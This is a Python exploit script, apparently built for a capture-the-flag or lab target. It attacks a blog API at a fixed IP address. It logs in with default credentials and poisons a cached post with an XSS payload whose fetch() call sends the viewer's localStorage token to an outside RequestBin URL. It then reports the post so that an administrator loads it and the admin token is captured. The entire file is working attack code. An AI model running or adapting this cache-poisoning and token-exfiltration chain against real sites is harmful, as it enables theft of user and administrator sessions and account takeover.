import requests
import time

SERVER_URL = "http://54.198.62.41"
REQUESTBIN_URL = "https://enr40so7luqr.x.pipedream.net"  # Your RequestBin URL

def login_user():
    login_data = {
        "username": "user",
        "password": "user123"
    }
    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
    return r.json()['token']

def poison_cache():
    # Get user token
    user_token = login_user()
    print(f"[+] Got user token: {user_token[:20]}...")

    # Try to get the current content first
    headers = {
        'Authorization': f'Bearer {user_token}',
        'X-Special-Key': 'secret_cache_key'
    }
    
    print("[+] Getting current post content...")
    r = requests.get(
        f"{SERVER_URL}/api/blog/post/1",
        headers=headers,
        timeout=10
    )
    current_content = r.text
    print(f"[+] Current cache headers: {dict(r.headers)}")

    # Create XSS payload
    xss_payload = f'<img src=x onerror="fetch(\'{REQUESTBIN_URL}?token=\'+localStorage.getItem(\'token\'))">'

    # Try to cache poison with GET parameters
    print("\n[+] Attempting cache poisoning...")
    poisoned_url = f"{SERVER_URL}/api/blog/post/1?content={xss_payload}"
    headers = {
        'Authorization': f'Bearer {user_token}',
        'X-Special-Key': 'secret_cache_key',
        'Cache-Control': 'no-store',  # Try to bypass any cache validations
        'Content-Type': 'application/json'
    }

    try:
        r = requests.get(
            poisoned_url,
            headers=headers,
            timeout=10
        )
        print(f"[+] Poison attempt status: {r.status_code}")
        print(f"[+] Response headers: {dict(r.headers)}")

        # Verify if cache was poisoned
        print("\n[+] Verifying cache...")
        r = requests.get(
            f"{SERVER_URL}/api/blog/post/1",
            headers={'X-Special-Key': 'secret_cache_key'},
            timeout=10
        )
        print(f"[+] Verify status: {r.status_code}")
        print(f"[+] Cache-Control: {r.headers.get('Cache-Control')}")
        print(f"[+] Content preview: {r.text[:200]}")

        # Report the post
        print("\n[+] Reporting post...")
        headers = {
            'Authorization': f'Bearer {user_token}',
            'Content-Type': 'application/json'
        }
        for _ in range(3):  # Try reporting multiple times
            try:
                r = requests.post(
                    f"{SERVER_URL}/api/blog/report",
                    headers=headers,
                    json={"postId": 1},
                    timeout=15  # Increased timeout
                )
                print(f"[+] Report status: {r.status_code}")
                if r.status_code == 200:
                    break
            except requests.exceptions.ReadTimeout:
                print("[!] Report request timed out, retrying...")
                continue
        
        print(f"[+] Check {REQUESTBIN_URL} for admin token!")
        
        # Monitor the cache
        print("\n[+] Monitoring cache for changes...")
        for i in range(3):
            time.sleep(2)
            r = requests.get(
                f"{SERVER_URL}/api/blog/post/1",
                headers={'X-Special-Key': 'secret_cache_key'},
                timeout=10
            )
            print(f"[+] Check {i+1} - Cache status: {r.status_code}")
            print(f"[+] Cache-Control: {r.headers.get('Cache-Control')}")
            if xss_payload in r.text:
                print("[!] XSS payload found in cache!")

    except Exception as e:
        print(f"[-] Error during poisoning: {e}")

if __name__ == "__main__":
    print("[+] Starting cache poisoning test...")
    poison_cache()